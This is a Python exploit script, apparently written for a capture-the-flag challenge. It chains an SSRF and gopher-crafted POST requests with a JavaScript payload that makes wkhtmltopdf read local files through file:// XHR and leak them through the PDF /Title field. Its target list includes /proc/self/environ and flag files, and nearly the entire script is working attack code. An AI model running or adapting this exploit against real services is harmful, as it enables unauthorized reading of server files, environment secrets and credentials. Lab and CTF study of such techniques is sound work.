#!/usr/bin/env python3
"""Local file reader: sync XHR inside the rendered page, leaked through PDF /Title.

Proven by js_lfi.py: wkhtmltopdf 0.12.5 here runs JavaScript, and synchronous
XMLHttpRequest to file:// succeeds (http:// XHR is rejected with NETWORK_ERR, so this is
the classic default-allow local file access). document.title is copied into the PDF as
a UTF-16BE /Title string, which is plaintext - no font/CMap decoding needed.

Reads a list of candidate paths and prints what each one yields.
"""
import base64
import html as H
import json
import re
import sys
import time
import urllib.parse

import gopher
import ssrf

READ = ('<script>var x=new XMLHttpRequest();x.open("GET","file://PATH",false);'
        'try{x.send();document.title="FILEDATA:"+encodeURIComponent(x.responseText).replace(/%00/g,"|");}'
        'catch(e){document.title="ERR:"+e;}</script>')


def w(s):
    sys.stdout.buffer.write((str(s) + "\n").encode("utf-8", "replace"))
    sys.stdout.flush()


def readfile(path, timeout=90):
    content = READ.replace("PATH", path)
    body = "content=" + urllib.parse.quote(content, safe="")
    feed = gopher.gopher_raw("POST", "/report", body,
                             ["Content-Type: application/x-www-form-urlencoded"])
    st, pg = ssrf.get("/", feed=feed, timeout=timeout)
    m = re.search(r'<pre class="tape">(.*?)</pre>', pg, re.S)
    raw = H.unescape(urllib.parse.unquote(m.group(1))) if m else ""
    rest = raw.partition("\r\n\r\n")[2]
    try:
        obj = json.loads(rest)
    except Exception:
        return "?notjson " + rest[:120]
    if not obj.get("data"):
        return "no data: %r" % (obj,)
    pdf = base64.b64decode(obj["data"])
    out = []
    for t in re.findall(rb"/Title \((.*?)\)", pdf, re.S):
        s = (t.decode("utf-16-be", "replace") if t[:2] == b"\xfe\xff"
             else t.decode("latin-1", "replace")).lstrip("\ufeff")
        out.append(s)
    if not out:
        return "no title (pdf=%d)" % len(pdf)
    val = out[0]
    if val.startswith("FILEDATA:"):
        return urllib.parse.unquote(val[9:])
    return val


PATHS = [
    "/proc/self/cmdline", "/proc/self/environ", "/proc/self/cwd",
    "/ctf/flag.txt", "/flag", "/flag.txt", "/app/flag.txt", "/opt/flag.txt",
    "/proc/self/root/ctf/flag.txt", "/etc/hostname",
]

if __name__ == "__main__":
    args = sys.argv[1:] or PATHS
    for p in args:
        w("=== %s\n%s" % (p, readfile(p)))
        sys.stdout.flush()
        time.sleep(1.0)
